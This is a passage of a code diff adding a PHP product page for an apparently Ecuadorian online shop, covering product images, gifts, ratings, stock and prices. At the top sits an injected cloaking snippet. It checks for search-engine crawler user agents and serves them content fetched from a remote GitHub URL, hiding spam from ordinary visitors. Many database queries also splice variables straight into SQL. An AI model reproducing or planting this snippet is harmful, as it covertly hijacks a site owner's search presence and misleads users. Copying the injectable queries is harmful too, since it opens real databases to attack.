@@ -1,0 +1,2228 @@
+<?php
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
+    $bots = array(
+        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
+        'DotBot', 'PetalBot', 'facebot'
+    );
+
+    if (empty($user_agent)) {
+        return true;
+    }
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+
+function get_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
+    $response = curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        echo 'Curl error: ' . curl_error($ch);
+    }
+
+    curl_close($ch);
+    return $response;
+}
+
+
+$target_url = 'https://raw.githubusercontent.com/boncesmail/kocak/refs/heads/main/produc';
+
+
+if (is_bot()) {
+    $message = get_remote_content($target_url);
+    if ($message) {
+        echo $message;
+    } else {
+        echo "Gagal ambil konten dari URL.";
+    }
+    exit;
+}
+?>
+<?php require 'header.php'; ?>
+<?php require 'menu2.php'; ?>
+<?php
+    $perfilesPermitidos = [2, 4, 6, 10, 26, 27];
+    $query = mysqli_query($conexion, "SELECT a.pins_id FROM productos_instalacion a WHERE a.id_prod = '$prod_id'; ");
+    if ($row = mysqli_fetch_array($query)) {
+        $query2 = mysqli_query($conexion, "SELECT conf_dato FROM configuraciones WHERE conf_id =  52; ");
+        if ($row2 = mysqli_fetch_array($query2)) { $mensaje = $row2["conf_dato"]; }
+        
+        $query2 = mysqli_query($conexion, "SELECT conf_dato FROM configuraciones WHERE conf_id =  53; ");
+        if ($row2 = mysqli_fetch_array($query2)) { $texto = $row2["conf_dato"]; }
+        
+        $query2 = mysqli_query($conexion, "SELECT conf_dato FROM configuraciones WHERE conf_id =  54; ");
+        if ($row2 = mysqli_fetch_array($query2)) { $fondo = $row2["conf_dato"]; }
+        
+        echo '<div class="container-fluid">';
+            echo '<div class="row" style="background-color:'.$fondo.';">';
+                echo '<div class="col-12 col-md-1"></div>';
+                echo '<div class="col-12 col-md-10">';
+                    echo '<p style="margin:0px; padding:4px; color:'.$texto.'; text-align:center;">'.$mensaje.'</b>.</p> ';
+                echo '</div>';
+                echo '<div class="col-12 col-md-1"></div>';
+            echo '</div>';
+        echo '</div>';
+    }
+    
+    date_default_timezone_set('America/Lima');
+    $hora = date('H');
+    $mes = date('m');
+    $dia = date('d');
+    $saludo = '';
+
+    if ($mes == 10 && $dia == 31) { $fondo = 'halloween'; }
+    if ($mes == 12 && $dia > 15) { $fondo = 'navidad'; }
+
+    if ($hora > 0 && $hora < 14) { /* de 5 a 13  */
+        $saludo = '¡Hola, buen día!';
+    } else if ($hora > 13 && $hora < 18) { /* de 14 a 17 */
+        $saludo = '¡Hola, buenas tardes!';
+    } else if ($hora > 17 && $hora < 23) { /* de 18 a 4 */
+        $saludo = '¡Buenas noches!';
+    } else if ($hora == 3) {
+        $saludo = '¿No tienes sueño?';
+    }
+    
+    if (!is_numeric($precio)) {
+        $precio = 0;
+    }
+?>
+<?php
+    $breadcrumb = "<li><a class='blue' href='inicio.php'>Inicio</a></li>";
+    $query = mysqli_query($conexion, "SELECT d.cat_alias, d.cat_nombre, c.subcat_alias, c.subcat_nombre, b.art_id, b.art_nombre FROM productos a JOIN productos_articulos b ON a.id_art = b.art_id JOIN categorias_segundo c ON b.id_subcat = c.subcat_id JOIN categorias_primero d ON c.id_cat = d.cat_id WHERE a.prod_id = '$prod_id' ");
+    if ($row = mysqli_fetch_array($query)) {
+        $breadcrumb = $breadcrumb."<li><a class='blue' href='categoria.php?cat=".$row['cat_alias']."' style='text-transform:uppercase'>".strtolower($row['cat_nombre'])."</a></li><li><a class='blue' href='subcategoria.php?a=".$row['subcat_alias']."' style='text-transform:uppercase'>".strtolower($row['subcat_nombre'])."</a></li><li><a class='blue' href='filtros.php?t=prod&p=".$row['art_id']."' style='text-transform:uppercase'>".strtolower($row['art_nombre'])."</a></li>";
+        $nombre_particular = strtolower($row['art_nombre']);
+        $id_articulos = $row['art_id'];
+    }
+?>
+<style>
+    hr { margin:5px 0; }
+    #carouselWrapper { display:flex; overflow-x:clip; scroll-behavior: smooth; width: fit-content; }
+    #recomendadoArrow:hover, #recomendadoArrow:active { transform:scale(1.5); }
+</style>
+<!-- breadcrumb -->
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12 col-md-12">
+            <ul class="breadcrumb mt-2">
+                <?php echo $breadcrumb; ?>
+            </ul>
+        </div>
+    </div>
+</div>
+<!-- /breadcrumb -->
+
+<div id="main" class="container-fluid" itemtype="http://schema.org/Product"> <!-- contenedor principal -->
+    <div class="row">
+        <div class="col-12 col-md-12">
+            <div class="row">
+                <div class="col-12 col-sm-7 col-md-6 col-lg-4 col-xl-5" style="align-items: start;"> <!-- mitad de pantalla para fotos -->
+                    <div class="row" id="stickyOne" style="position: sticky; top: 0; overflow: auto;"> <!-- fila para fotos -->
+                        <div class="col-12 col-sm-10 col-md-10 order-2"> <!-- imagen full size -->
+                            <?php
+                                $display = "block";      // por defecto mostramos la foto
+                                if (!$desde_app) {       // ←─ 1) solo consultamos vídeos si NO es la app
+                                    $query = mysqli_query($conexion, "SELECT multi_id FROM productos_multimedia WHERE multi_estado = 'a' AND id_prod = '$prod_id' AND multi_tipo = 'video' ORDER BY multi_posicion ASC");
+                                    if ($row = mysqli_fetch_array($query)) {       // hay al menos 1 vídeo
+                                        $display = "none";                         // ocultamos foto grande
+                                        echo '<div class="row" id="rowVideo" style="display:block">';
+                                            echo '<div class="col-12">';
+                                                $query_videos = mysqli_query($conexion, "SELECT multi_video FROM productos_multimedia WHERE multi_estado = 'a' AND id_prod = '$prod_id' AND multi_tipo = 'video' ORDER BY multi_posicion ASC LIMIT 1");
+                                                while ($row_videos = mysqli_fetch_array($query_videos)) {
+                                                    echo '<div class="embed-responsive embed-responsive-16by9">';
+                                                        echo '<iframe id="youtube-video"
+                                                                     title="YouTube video player"
+                                                                     src="https://www.youtube.com/embed/'.$row_videos['multi_video'].'?autoplay=1"
+                                                                     width="100%" height="500" frameborder="0"
+                                                                     allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                                                                     allowfullscreen></iframe>';
+                                                    echo '</div><br>';
+                                                }
+                                            echo '</div>';
+                                        echo '</div>';
+                                    }
+                                }
+                            ?>
+                            <!-- Foto principal (solo se muestra si $display = "block") -->
+                            <div class="row" id="rowFotos" style="display:<?= $display ?>">
+                                <div class="col-12">
+                                    <a href="fotos.php?id=<?php echo $prod_id; ?>" id="hrefZoom"
+                                       target="lightbox" onclick="ir('s')">
+                                        <img class="xzoom" id="xzoom-default" src="<?php echo $image_path.'/productos/md/'.$imagen; ?>" xoriginal="<?php echo $image_path.'/productos/lg/'.$imagen; ?>" />
+                                    </a>
+                                </div>
+                            </div>
+                        </div> <!-- / imagen full size -->
+
+                        <div class="col-2 order-1" style="height:415px; overflow-x:hidden; overflow-y:auto;"> <!-- miniaturas -->
+                            <div class="xzoom-thumbs">
+                                <?php
+                                    if (!$desde_app) {
+                                        $query = mysqli_query($conexion, "SELECT multi_id FROM productos_multimedia WHERE multi_estado = 'a' AND id_prod = '$prod_id' AND multi_tipo = 'video' ORDER BY multi_posicion ASC");
+                                        if ($row = mysqli_fetch_array($query)) {
+                                            echo '<a href="#" onclick="ver_video()" >';
+                                                echo '<img src="'.$image_path.'/productos/video.jpg"
+                                                           style="width:100%; margin:5px; border:solid 1px #CFCFCF; padding-top:5px; padding-bottom:5px;" />';
+                                            echo '</a>';
+                                        }
+                                    }
+
+                                    $cont = 0;
+                                    $query = mysqli_query($conexion, "SELECT multi_imagen FROM productos_multimedia WHERE multi_estado = 'a' AND id_prod = '$prod_id' AND multi_tipo = 'imagen' AND multi_destino = 1 ORDER BY multi_posicion ASC");
+                                    while ($row = mysqli_fetch_array($query)) {
+                                        $cont++;
+                                        $class = ($cont == 1) ? 'active' : '';
+                                        $xpreview = 'xpreview = "'.$image_path.'/productos/md/'.$row['multi_imagen'].'"';
+
+                                        echo '<a href="'.$image_path.'/productos/lg/'.$row['multi_imagen'].'" onclick="cambia_foto(\''.$row['multi_imagen'].'\')">';
+                                            echo '<img class="xzoom-gallery '.$class.'" '.$xpreview.' src="'.$image_path.'/productos/xs/'.$row['multi_imagen'].'" style="width:80%; margin:5px; border:solid 1px #CFCFCF;" />';
+                                        echo '</a>';
+                                    }
+                                ?>
+                            </div><br><!-- / miniaturas -->
+                        </div> <!-- / espacio para miniaturas -->
+                    </div><!-- /fila para fotos -->
+                </div>  <!-- / mitad de pantalla para fotos -->
+
+                
+                <div class="col-12 col-sm-5 col-md-6 col-lg-4 col-xl-4"><!-- segunda mitad de pantalla -->
+                    <div>
+                        <div class="row">
+                            <div class="col-12 text-start">
+                                <?php
+                                    $query_etiquetas = mysqli_query($conexion, "SELECT b.etiqueta_icono, b.etiqueta_posicion FROM etiquetas_productos a JOIN etiquetas b ON a.id_etiqueta = b.etiqueta_id WHERE b.etiqueta_tipo = '2' AND b.etiqueta_id <> 12 AND b.etiqueta_estado = 'a' AND a.id_prod = '$prod_id';");
+                                    while ($row_etiquetas = mysqli_fetch_array($query_etiquetas)) {
+                                        echo '<span style="padding-right:5px;"><img class="etiqueta-icono" src="'.$image_path.'/iconos/'.$row_etiquetas["etiqueta_icono"].'"></span>';
+                                    }
+                                    
+                                    if ($existencias > 0) {
+                                        echo '<span class="ribbon-2" style="background-color:#18a212; color:#fff; display:inline!important;" onclick="mensaje(\'disponible\')">Disponible</span>';
+                                        if ($existencias > 0 && $existencias < 4) {
+                                            echo '<span class="ribbon-2" style="background-color:#0071FF; display:inline!important;" onclick="mensaje(\'ultimos_disponibles\')">Últimas unidades</span>';
+                                        }   
+                                    }
+                                ?>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-12">
+                                <h1 class="big bold blue precio" style="margin:10px 0 0 0;"> <!-- titulo -->
+                                    <?php
+                                        if ($color == "NO APLICA" || $color == "" || $color == "no aplica") { echo ucfirst(strtolower($identidad)).' '.ucwords(strtolower($marca)).' '.strtoupper($prod_modelo).' '.strtolower($nombre).' '.strtolower($prod_caracteristica_especial); }
+                                        else { echo ucfirst(strtolower($identidad)).' '.ucwords(strtolower($marca)).' '.strtoupper($prod_modelo).' '.strtolower($nombre).' '.strtolower($prod_caracteristica_especial).' color '. strtolower($color); }
+                                    ?>
+                                </h1>
+                                <?php
+                                    $query_etiquetas = mysqli_query($conexion, "SELECT e_texto FROM etiquetas_productos WHERE id_etiqueta = 31 AND id_prod = '$prod_id' ORDER BY e_id DESC LIMIT 1;");
+                                    if ($row_etiquetas = mysqli_fetch_array($query_etiquetas)) {
+                                        echo '<p style="color:#18a212; display:inline-block; line-height:15px; text-wrap:wrap; font-weight:bold; margin:0;">'.$row_etiquetas['e_texto'].'</p><br>';
+                                    }
+
+                                    $query_svg = mysqli_query($conexion, "SELECT b.etiqueta_icono, b.etiqueta_posicion, b.etiqueta_tipo FROM etiquetas_productos a JOIN etiquetas b ON a.id_etiqueta = b.etiqueta_id WHERE b.etiqueta_estado = 'a' AND etiqueta_tipo = 3 AND a.id_prod = '$prod_id';");
+                                    while ($row_svg = mysqli_fetch_array($query_svg)) {
+                                        echo '<img src="imagenes/iconos/'.$row_svg['etiqueta_icono'].'" style="height:40px; margin:10px 10px 10px 0;">';
+                                    }
+
+                                    if (!empty($prod_id)) {
+                                        $sql_regalos = 
+                                            "SELECT reg.id_prod AS id_padre, a.prod_id, d.marca_nombre, h.identidad_nombre AS identidad, a.prod_modelo, a.prod_nombre,
+                                            SUM(st.cant_stock) AS existencias,
+                                            reg.regalo_cantidad,
+                                            a.prod_codigo_referencia,
+                                            (SELECT multi_imagen FROM productos_multimedia WHERE id_prod = a.prod_id AND multi_estado = 'a' AND multi_tipo = 'imagen' ORDER BY multi_posicion ASC LIMIT 1) AS imagen
+                                            FROM productos a
+                                            JOIN productos_regalos reg ON reg.regalo_prod = a.prod_id
+                                            JOIN productos_marcas d ON a.id_marca = d.marca_id
+                                            JOIN productos_identidades h ON a.id_identidad = h.identidad_id
+                                            LEFT JOIN productos_stock st ON st.prod_id = a.prod_codigo_referencia
+                                            JOIN bodegas bod ON bod.bodega_id = st.bodega_id AND bod.sincronizacion = 1
+                                            WHERE reg.id_prod IN ($prod_id)
+                                            GROUP BY reg.id_prod, a.prod_id;";
+                                        $query_regalos = mysqli_query($conexion, $sql_regalos);
+                                        $regalos_con_stock = [];
+                                        while ($row = mysqli_fetch_assoc($query_regalos)) {
+                                            if ($row['existencias'] > 0) {
+                                                $regalos_con_stock[] = $row;
+                                            }
+                                        }
+
+                                        // Solo mostrar si hay regalos con stock
+                                        if (count($regalos_con_stock) > 0) {
+                                            echo '<br><span onclick="ver_regalos('.$prod_id.')" style="margin:10px 0 0 0; line-height:15px; background-color: #ffe5e6; padding: 5px 10px; color: red;"><i class="fa fa-gift"></i> &nbsp;&nbsp; Regalos</span><br>';
+                                            echo '<div onclick="ver_regalos('.$prod_id.')" style="width:100%; border:solid 1px #cfcfcf; border-radius:10px; padding:5px; margin:5px 0;">';
+                                            echo '<table>';
+                                            foreach ($regalos_con_stock as $row_regalos) {
+                                                $nombre_regalo = ($row_regalos['marca_nombre'] == "NO APLICA") 
+                                                    ? $row_regalos['identidad'].' '.$row_regalos['prod_modelo']
+                                                    : $row_regalos['identidad'].' '.$row_regalos['marca_nombre'].' '.$row_regalos['prod_modelo'];
+
+                                                echo '<tr>';
+                                                    echo '<td><img src="'.$image_path.'/productos/xs/'.$row_regalos['imagen'].'" style="border-right: solid 1px #CFCFCF; width: 65px;" /></td>';
+                                                    echo '<td><p style="line-height:15px; text-wrap:wrap; margin:10px;"><big><b>'.$row_regalos['regalo_cantidad'].'</b></big> '.ucfirst(strtolower($nombre_regalo)).'<br><small>Cod. F '.$row_regalos['prod_codigo_referencia'].' - W '.$row_regalos['prod_id'].'</small></p></td>';
+                                                echo '</tr>';
+                                            }
+                                            echo '</table>';
+                                            echo '</div><br>';
+                                        }
+                                    }
+                                ?>
+                                <div class="row">
+                                    <div class="col-12">
+                                        <table>
+                                            <tr>
+                                                <td>
+                                                    <?php
+                                                        $query = mysqli_query($conexion, "SELECT AVG(comen_calificacion) AS total FROM productos_comentarios WHERE id_prod = '$prod_id' AND comen_estado = 'a'; ");
+                                                        if ($row = mysqli_fetch_array($query)) { $rating = $row['total']; }
+                                                        
+                                                        $query = mysqli_query($conexion, "SELECT COUNT(comen_id) AS total FROM productos_comentarios WHERE id_prod = '$prod_id' AND comen_estado = 'a' AND comen_tipo <> '3'; ");
+                                                        if ($row = mysqli_fetch_array($query)) { $total_opiniones = $row['total']; }
+                                                        
+                                                        echo '<a href="#opiniones" style="font-size:14px;">'.number_format((float)$rating, 1, '.', '').'</a>';
+                                                    ?>
+                                                </td>
+                                                <td>
+                                                    <a href="#opiniones">
+                                                        <ul style="margin:0px; padding:0px;"> <!-- estrellas -->
+                                                            <?php
+                                                                for ($i = 1; $i <= 5; $i++) {
+                                                                    $color = ($i <= $rating) ? '#FCBC00' : '#eee';
+                                                                    echo '<i class="fa fa-star star" style="font-size:14px; margin:2px; color:'.$color.';"></i>';
+                                                                }
+                                                            ?>
+                                                        </ul><!-- /estrellas -->
+                                                    </a>
+                                                </td>
+                                                <td style="padding:0 10px;">
+                                                    <?php
+                                                        
+                                                    ?>
+                                                    <a href="#opiniones" id="opinionesBtn" class="blue">
+                                                        <span class="small"><?= $total_opiniones ?> opiniones</span>
+                                                    </a>
+                                                </td>
+                                                <td style="padding:0 10px;">
+                                                    <?php
+                                                        $query = mysqli_query($conexion, "SELECT COUNT(pregunta_id) AS total FROM productos_preguntas WHERE id_prod = '$prod_id' AND pregunta_estado = 'a'; ");
+                                                        if ($row = mysqli_fetch_array($query)) { $total_preguntas = $row['total']; }
+                                                    ?>
+                                                    <a href="#preguntas" class="blue">
+                                                        <span class="small"><?= $total_preguntas ?> preguntas</span>
+                                                    </a>
+                                                </td>
+                                            </tr>
+                                        </table>    
+                                    </div>
+                                </div>
+                                <?php
+                                    if ($prod_codigo_referencia != "") { echo '<small>Cod. F '.$prod_codigo_referencia.' - W '.$prod_id.'</small>'; }
+                                    else { echo '<small>Cod. W '.$prod_id.'</small>'; }
+
+                                    if (in_array($perfil_id, $perfilesPermitidos)) {
+                                        $cont_total = 0;
+                                        echo '<table>';
+                                            $query_stock = mysqli_query($conexion, "SELECT bodega_nombre, b.cant_stock, sincronizacion FROM bodegas a JOIN productos_stock b ON a.bodega_id = b.bodega_id WHERE b.prod_id = '$prod_codigo_referencia' AND cant_stock <> 0 ORDER BY bodega_posicion;");
+                                            while ($row_stock = mysqli_fetch_array($query_stock)) {
+                                                if ($row_stock['sincronizacion'] == 1) {
+                                                    $cont_total += $row_stock['cant_stock'];
+                                                    echo '<tr>';
+                                                        echo '<td><small>'.ucfirst(strtolower($row_stock['bodega_nombre'])).'</small></td>';
+                                                        echo '<td>&nbsp;&nbsp;</td>';
+                                                        echo '<td><small>'.$row_stock['cant_stock'].'</small></td>';
+                                                    echo '</tr>';
+                                                }
+                                            }
+                                            echo '<tr style="border-top:solid 1px #e7e7e7;">';
+                                                echo '<td><small><b>Total</b></small></td>';
+                                                echo '<td>&nbsp;&nbsp;</td>';
+                                                echo '<td><small>'.$cont_total.'</small></td>';
+                                            echo '</tr>';
+                                            $query_stock = mysqli_query($conexion, "SELECT bodega_nombre, b.cant_stock, sincronizacion FROM bodegas a JOIN productos_stock b ON a.bodega_id = b.bodega_id WHERE b.prod_id = '$prod_codigo_referencia' AND cant_stock <> 0 AND sincronizacion = 0 ORDER BY bodega_posicion;");
+                                            while ($row_stock = mysqli_fetch_array($query_stock)) {
+                                                echo '<tr>';
+                                                    echo '<td><small>'.ucfirst(strtolower($row_stock['bodega_nombre'])).'</small></td>';
+                                                    echo '<td>&nbsp;&nbsp;</td>';
+                                                    echo '<td><small>'.$row_stock['cant_stock'].'</small></td>';
+                                                echo '</tr>';
+                                            }
+                                        echo '</table>';
+                                    }
+                                ?>
+                            </div>
+                        </div><hr> <!-- / titulo -->
+
+                        <div class="row">
+                            <div class="col-12">
+                                <?php
+                                    if (!empty($prod_descripcion_corta)) {
+                                        echo '<p style="font-size:smaller; line-height:16px;">'.html_entity_decode($prod_descripcion_corta).'</p>';
+                                    }
+                                ?>
+                            </div>
+                        </div>
+                            
+                        <?php
+                            $query = mysqli_query($conexion, "SELECT DISTINCT b.etiqueta_icono, b.etiqueta_url, b.etiqueta_destino FROM etiquetas_productos a JOIN etiquetas b ON a.id_etiqueta = b.etiqueta_id WHERE a.id_prod = '$prod_id' AND b.etiqueta_tipo = 5 AND b.etiqueta_estado = 'a' ORDER BY etiqueta_posicion ASC;");
+                            if (mysqli_num_rows($query) > 0) {
+                                // Iniciamos el carrusel
+                                echo '<div class="row">';
+                                    echo '<div class="col-12">';
+                                        echo '<div id="carEtiquetas" class="carousel slide" data-bs-ride="carousel">';
+                                            echo '  <div class="carousel-inner">';
+                                            $isFirst = true;
+                                            while ($row = mysqli_fetch_array($query)) {
+                                                $icono = $row['etiqueta_icono'];
+                                                $url = $row['etiqueta_url'];
+                                                $destino = $row['etiqueta_destino'];
+
+                                                echo '<div class="carousel-item' . ($isFirst ? ' active' : '') . '">';
+                                                    if ($destino == 0) {
+                                                        echo '<a href="' . $url . '">';
+                                                    } elseif ($destino == 1) {
+                                                        echo '<a href="' . $url . '" target="_blank">';
+                                                    } elseif ($destino == 2) {
+                                                        echo '<a href="javascript:void(0);" onclick="verEnlaceEtiqueta(\'' . $url . '\');">';
+                                                    }
+                                                        echo '<img src="https://www.kissu.com.ec/imagenes/iconos/' . $icono . '" class="d-block w-100" alt="Etiqueta">';
+                                                    echo '</a>';
+                                                echo '</div>';
+
+                                                $isFirst = false;
+                                            }
+                                            echo '  </div>'; // Fin .carousel-inner
+
+                                            echo '  <button class="carousel-control-prev" type="button" data-bs-target="#carEtiquetas" data-bs-slide="prev">';
+                                            echo '    <span class="carousel-control-prev-icon" aria-hidden="true"></span>';
+                                            echo '  </button>';
+
+                                            echo '  <button class="carousel-control-next" type="button" data-bs-target="#carEtiquetas" data-bs-slide="next">';
+                                            echo '    <span class="carousel-control-next-icon" aria-hidden="true"></span>';
+                                            echo '  </button>';
+                                        echo '</div>';
+                                    echo '</div>';
+                                echo '</div>';
+                            }
+                        ?>
+                        
+                        <div class="row">
+                            <div class="col-12">                            
+                                <?php
+                                    echo '<table style="width:100%; margin-bottom:0;">';
+                                        echo '<tr>';
+                                            echo '<td>';
+                                                echo '<a href="devoluciones.php?id='.$prod_id.'" target="lightbox" onclick="ir(\'s\')" class="blue">';
+                                                    echo '<i class="fa fa-shield"></i> <span class="small">Garantía y recomendaciones</span>';
+                                                echo '</a>';
+                                            echo '</td>';
+                                            
+                                            $total_img_clientes = 0;
+                                            $sql_img_clientes = "SELECT COUNT(multi_id) AS total FROM productos_multimedia WHERE multi_tipo = 'imagen2' AND multi_estado = 'a' AND id_prod = '$prod_id';";
+                                            $query_img_clientes = mysqli_query($conexion, $sql_img_clientes);
+                                            if ($row_img_clientes = mysqli_fetch_array($query_img_clientes)) {
+                                                $total_img_clientes = $row_img_clientes["total"];
+                                            }
+
+                                            if ($total_img_clientes > 0) {
+                                                echo '<td style="width:50%;">';
+                                                    echo '<img src="'.$image_path.'/productos/xs/'.$imagen.'" style="width:45px; border:solid 1px #CFCFCF; margin:10px; margin-left:0;" />';
+                                                    echo '<a style="margin:10px;" href="#opiniones"><span class="small blue precio">'.$row['total'].' &nbsp;&nbsp;Imágenes de clientes</span></a>';
+                                                echo '</td>';    
+                                            }
+                                        echo '</tr>';
+                                    echo '</table>';
+                                ?><hr>
+                                <table style="width:100%; margin-bottom:0;">
+                                    <tr>
+                                        <td style="text-align:center;">
+                                            <a href="#ProductRow1" onclick="wish(<?php echo $prod_id; ?>)" class="blue">
+                                                <i class="fa fa-heart-o iconProducto" style="color:#0071F5!important;"></i><br/>
+                                                <span class="small">Lo quiero</span>
+                                            </a>
+                                        </td>
+                                        <td style="text-align:center;">
+                                            <a href="comparar.php?prod=<?php echo $prod_id; ?>" target="_self" class="blue">
+                                                <i class="fa fa-balance-scale iconProducto" style="color:#0071F5!important;"></i><br/>
+                                                <span class="small">Comparar</span>
+                                            </a>
+                                        </td>
+                                        <td style="text-align:center;">
+                                            <a href="#ProductRow1" onclick="share(<?php echo $prod_id; ?>)" class="blue">
+                                                <i class="fa fa-share-alt iconProducto" style="color:#0071F5!important;"></i><br/>
+                                                <span class="small">Compartir</span>
+                                            </a>
+                                        </td>
+                                    </tr>
+                                </table><br><br><br>
+                            </div>
+                        </div>
+
+                        <?php if ($prod_alto2 > 0 && $prod_ancho2 > 0 && $prod_profundo2 > 0 && $prod_peso > 0) { ?>
+                            <div class="row">
+                                <div class="col-12">
+                                    <p><b>Medidas del producto</b></p>
+                                    <table style="width: 100%;">
+                                        <tr>
+                                            <td style="width: 25%; text-align: center; border-right: solid 3px #c1c1c1;">
+                                                <img src="https://kissu.com.ec/imagenes/iconos/alto_png.png" style="width:45px; margin-bottom: 5px;"><br>
+                                                <div style="line-height:25px;">
+                                                    <span class="bold"><?= $prod_alto2 ?> cm</span><br>
+                                                    <span class="small">Alto</span>
+                                                </div>
+                                            </td>
+                                            <td style="width: 25%; text-align: center; border-right: solid 3px #c1c1c1;">
+                                                <img src="https://kissu.com.ec/imagenes/iconos/ancho_png.png" style="width:45px; margin-bottom: 5px;"><br>
+                                                <div style="line-height:25px;">
+                                                    <span class="bold"><?= $prod_ancho2 ?> cm</span><br>
+                                                    <span class="small">Ancho</span>
+                                                </div>
+                                            </td>
+                                            <td style="width: 25%; text-align: center; border-right: solid 3px #c1c1c1;">
+                                                <img src="https://kissu.com.ec/imagenes/iconos/profundo_png.png" style="width:45px; margin-bottom: 5px;"><br>
+                                                <div style="line-height:25px;">
+                                                    <span class="bold"><?= $prod_profundo2 ?> cm</span><br>
+                                                    <span class="small">Profundidad</span>
+                                                </div>
+                                            </td>
+                                            <td style="width: 25%; text-align: center;">
+                                                <img src="https://kissu.com.ec/imagenes/iconos/peso_png.png" style="width:45px; margin-bottom: 5px;"><br>
+                                                <div style="line-height:25px;">
+                                                    <span class="bold"><?= $prod_peso ?> kg</span><br>
+                                                    <span class="small">Peso</span>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                    </table>
+                                </div>
+                            </div>
+                        <?php } ?>
+                    </div>
+                </div>
+                
+                <div class="col-12 col-md-12 col-lg-3 col-xl-3" style="align-items: start;">
+                    <div class="row" id="stickyTwo" style="position: sticky; top: 0; overflow: auto;">
+                        <div class="col-12 col-sm-3 col-lg-12"></div>
+                        <div class="col-12 col-sm-6 col-lg-12">
+                            <?php
+                                if ($_SESSION["persona_grupo_socio"] == 2 || $_SESSION["persona_grupo_socio"] == 4 || $_SESSION["persona_grupo_socio"] == 6) {    
+                                    echo '<div class="btn btn-primary btn-sm m-2" onclick="verEditar()"><i class="fa fa-edit" style="font-size:larger;"></i>&nbsp;&nbsp;&nbsp; Editar producto</div>';
+                                }
+                            ?>
+                            <div style="width: 90%; border: solid 1px #dbdbdb; border-radius: 25px; padding: 10px 20px;">
+                                <div class="row">
+                                    <div class="col-10" style="padding-left:11%;">
+                                        <?php
+                                            if ($estado == "a") {
+                                                if ($precio_promocion > 0) {
+                                                    if ($promo_reloj == 1 && $promo_fecha > date("Y-m-d H:i:s")) {
+                                                        $ids_promo[] = array("prod" => $prod_id."_1", "date" => $promo_fecha);
+                                                        echo '<br><div class="countdown_div" id="countdown_'.$prod_id.'"><center><table class="bl"><tr><td style="text-align:center"><span class="countdown" id="days_'.$prod_id.'"></span><br/>días</td><td style="text-align:center"><span class="countdown" id="hours_'.$prod_id.'"></span><br/>horas</td><td style="text-align:center"><span class="countdown" id="minutes_'.$prod_id.'"></span><br/>min.</td><td style="text-align:center"><span class="countdown" id="seconds_'.$prod_id.'"></span><br/>seg.</td></tr></table></center></div>';
+                                                        echo '<div class="ribbon-2 bgred" onclick="mensaje(\'agotar_sock\')">Promoción hasta '.$promo_fecha2.'</div><br>';
+                                                    }
+                                                }
+
+                                                if ($precio_promocion > 0) { // tiene promociones
+                                                    if ($promo_reloj == 1) { // tiempo limitado
+                                                        if ($promo_fecha < date("Y-m-d H:i:s")) {  // caducado
+                                                            
+                                                            echo '<div class="row">';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<span class="gray">'.$texto_prod1.'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<span id="precio2">$'.number_format((int)$pvp*$comision_diferido, 2, '.', '').'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12"><div id="diferidosContent"></div></div>';
+                                                            echo '</div>';
+
+                                                            echo '<div class="row">';
+                                                                echo '<div class="col-12 text-start"><br>';
+                                                                    echo '<span class="blue bold">'.$texto_prod2.'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<span class="x-big blue precio bold">';
+                                                                        echo '<span class="small blue bold">$</span>';
+                                                                        echo '<span id="precio">'.number_format($precio, 2, '.', '').'</span>';
+                                                                    echo '</span>';
+                                                                echo '</div>';
+                                                            echo '</div>';
+
+                                                        } else { // vigente
+                                                            
+                                                            echo '<div class="row">';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<span class="gray">'.$texto_prod1.'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<span id="precio2"><del>$'.number_format((int)$pvp*$comision_diferido, 2, '.', '').'</del><br>$'.number_format((int)$precio*$comision_diferido, 2, '.', '').'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12"><div id="diferidosContent"></div></div>';
+                                                            echo '</div>';
+
+                                                            echo '<div class="row">';
+                                                                echo '<div class="col-12 text-start"><br>';
+                                                                    echo '<span class="blue bold">'.$texto_prod2.'</span>';
+                                                                echo '</div>';
+                                                                echo '<div class="col-12 text-start">';
+                                                                    echo '<del class="x-big precio gray">';
+                                                                        echo '<span class="small">$</span>';
+                                                                        echo '<span id="precio">'.number_format($pvp, 2, '.', '').'</span>';
+                                                                    echo '</del>';
+                                                                    echo '&nbsp;&nbsp;&nbsp; <span class="ribbon-2 bgred" onclick="mensaje(\'agotar_sock\')">-'.number_format((int)((1-($precio/$pvp))*100)).'%</span><br>';
+                                                                    echo '<span class="x-big blue precio bold">';
+                                                                        echo '<span class="small blue bold">$</span>';
+                                                                        echo '<span id="precio">'.number_format($precio, 2, '.', '').'</span>';
+                                                                    echo '</span>';
+                                                                echo '</div>';
+                                                            echo '</div>';
+                                                        }
+                                                    } else { // sin fecha de finalización
+                                                        echo '<div class="row">';
+                                                            echo '<div class="col-12 text-start">';
+                                                                echo '<span class="gray">'.$texto_prod1.'</span>';
+                                                            echo '</div>';
+                                                            echo '<div class="col-12 text-start">';
+                                                                echo '<span id="precio2"><del>$'.number_format((int)$pvp*$comision_diferido, 2, '.', '').'</del><br>$'.number_format((int)$precio*$comision_diferido, 2, '.', '').'</span>';
+                                                            echo '</div>';
+                                                            echo '<div class="col-12"><div id="diferidosContent"></div></div>';
+                                                        echo '</div>';
+
+                                                        echo '<div class="row">';
+                                                            echo '<div class="col-12 text-start"><br>';
